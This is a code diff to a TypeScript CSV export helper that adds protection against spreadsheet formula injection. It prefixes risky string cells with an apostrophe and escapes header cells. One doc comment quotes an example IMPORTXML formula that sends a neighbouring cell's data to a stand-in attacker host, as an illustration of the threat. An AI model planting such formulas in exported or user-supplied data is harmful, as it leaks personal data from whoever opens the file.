@@ -151,20 +151,50 @@ export function fillTimeSeries(
 }
 
 /**
+ * Characters that make Excel, LibreOffice and Sheets treat a cell as a formula
+ * rather than text. Leading tab and CR are included because both are stripped
+ * on import, exposing whatever follows them.
+ */
+const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];
+
+/**
+ * Neutralise a spreadsheet formula in a *string* cell by prefixing an
+ * apostrophe, which every major spreadsheet reads as "the rest is literal text"
+ * and does not display.
+ *
+ * RFC 4180 quoting is not protection: Excel evaluates `"=1+1"` exactly as it
+ * evaluates `=1+1`. Without this, a value like
+ * `=IMPORTXML("https://attacker/?d="&A2,"//a")` in an exported cell runs when
+ * the recipient opens the file, and exfiltrates the row next to it. The staff
+ * export carries member names, which any invited team member sets themselves,
+ * so the payload and the reader are on opposite sides of a trust boundary.
+ *
+ * Only strings are considered: numeric cells are produced by this codebase, not
+ * by users, and prefixing them would turn a legitimate negative number into
+ * text.
+ */
+function neutralizeFormula(value: string | number | boolean | null): string | number | boolean | null {
+  if (typeof value !== 'string' || value.length === 0) return value;
+  return FORMULA_TRIGGERS.includes(value[0] as string) ? `'${value}` : value;
+}
+
+/**
  * Render rows of primitives as RFC 4180 CSV (CRLF line endings, values
  * containing a comma/quote/newline are quoted and internal quotes doubled).
- * Column order follows the keys of the first row.
+ * Column order follows the keys of the first row. String cells that would be
+ * read as formulas are neutralised — see {@link neutralizeFormula}.
  */
 export function toCsv(rows: Record<string, string | number | boolean | null>[]): string {
   if (rows.length === 0) return '';
 
   const headers = Object.keys(rows[0] as Record<string, unknown>);
-  const escape = (value: string | number | boolean | null): string => {
+  const escape = (raw: string | number | boolean | null): string => {
+    const value = neutralizeFormula(raw);
     const str = value === null || value === undefined ? '' : String(value);
     return /[",\r\n]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
   };
 
-  const lines = [headers.join(',')];
+  const lines = [headers.map((h) => escape(h)).join(',')];
   for (const row of rows) {
     lines.push(headers.map((h) => escape(row[h] ?? null)).join(','));
   }
